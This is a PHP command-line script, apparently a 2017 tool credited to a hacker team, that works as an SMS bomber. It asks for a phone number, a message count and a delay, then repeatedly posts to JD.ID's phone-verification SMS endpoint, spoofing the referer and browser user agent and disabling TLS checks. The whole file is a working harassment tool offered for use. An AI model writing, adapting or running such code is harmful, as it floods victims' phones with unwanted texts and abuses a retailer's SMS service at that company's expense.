<?php
/*
  SPAMMER SMS JD.ID
  Code By ZeroSvn@babbycyberteam.org
*/
@ini_set('output_buffering',0);
function jdidbom($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
echo "
################################################
#                                              #
#   ..::[ Spammer SMS From JD.ID ]::..         #
#   Coded By    : ZeroSvn                      #
#   Contact Me  : babbycyberteam@gmail.com     #
#   Date        : 19/12/2017                   #
#   Thanks to   : BabbyCyberTeam & SGB-TEAM    #
#                                              #
################################################\n\n";
echo "Nomor? (ex : 8xxxx)\nInput : ";
$nomor = trim(fgets(STDIN));
echo "Jumlah?\nInput : ";
$jumlah = trim(fgets(STDIN));
echo "Jeda? 0-99999 (ex:1)\nInput : ";
$jeda = trim(fgets(STDIN));
$execute = jdidbom($nomor, $jumlah, $jeda);
print $execute;
?>
